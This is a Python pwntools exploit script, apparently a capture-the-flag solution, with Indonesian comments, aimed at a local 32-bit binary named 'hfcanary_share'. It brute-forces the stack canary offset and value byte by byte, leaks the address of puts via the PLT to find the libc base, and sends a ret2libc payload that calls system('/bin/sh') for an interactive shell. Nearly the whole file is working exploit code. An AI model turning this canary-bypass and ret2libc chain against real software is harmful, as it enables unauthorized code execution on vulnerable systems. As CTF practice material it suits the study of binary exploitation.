from pwn import *
elf = ELF("./hfcanary_share")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
#r = elf.process()
def find_offset_to_canary():
    offset = 1
    p = "A"
    for i in range(1,1000):
        print "[!] percobaan ke -",i
        con = elf.process()
        p += "A"
        con.recvuntil("[?] Your Suggestion : ")
        con.sendline(p)
        respon = con.recv()
        if '*** "stack smashing is bad" ' in respon:
            #offset -= 1
            con.close()
            break
        else:
            offset += 1
            con.close()
    print "[!] offset : ",offset
    return offset

def brute_canary(offset):
    canary = ""
    offset = 256

    for x in range(4): # 32bit itu 4 byte data di Stack
        for y in range(255): # karna ASCII adalah 255
            if y == 10: # gatau kenapa kalo 10 sung berenti wkwk
                continue # jadi di skip sadja
            r = elf.process()
            r.recvuntil("[?] Your Suggestion : ")
            p = "A" * offset + canary + chr(y)
            print "[!] payload : ",p
            print "[!] offset  : ", offset
            print "[!] nilai canary : ",canary
            r.sendline(p)
            res = r.recv()
            if "Thank you for your suggestion" in res:
                canary += chr(y)
                print "[?] ketemu : ", chr(y)
                r.close()
                break
            else:
                r.close()
    print "[!] canary adalah : ",hex(u32(canary))
    return canary

def exploit():
    canary = 0xc0bac0ba
    offset_2_canary = 256
    offset_2_rip = 8
    puts_plt = 0x080483e0
    puts_libc = 0x0804a018
    addres_main = 0x080485cd
    r = elf.process()

    p = ""
    p += "A" * offset_2_canary
    p += p32(canary)
    p += "A" * offset_2_rip
    p += p32(puts_plt)
    p += p32(addres_main)
    p += p32(puts_libc)

    #r.recvuntil("[?] Your Suggestion : ")
    r.sendline(p)
    r.recvuntil("Thank you for your suggestion\n")
    puts_libc_leak = u32(r.recv(4).strip())
    print "[!] alamat memory puts_libc leaked : ",hex(puts_libc_leak)
    #r.interactive()

    # perhitungan ke libc base
    libc_base   = puts_libc_leak - libc.symbols['puts']
    libc_system = libc_base + libc.symbols['system']
    libc_binsh  = libc_base + libc.search("/bin/sh").next()

    p = ""
    p += "A" * offset_2_canary
    p += p32(canary)
    p += "A" * offset_2_rip
    p += p32(libc_system)
    p += "ALAN"
    p += p32(libc_binsh)

    r.sendline(p)

    r.interactive()


def main():
    #offset = find_offset_to_canary()
    #canary = brute_canary(offset)
    #print "[!] offset       : ",offset
    #print "[!] nilai canary : ",hex(u32(canary))
    exploit()


if __name__ == '__main__':
    main()
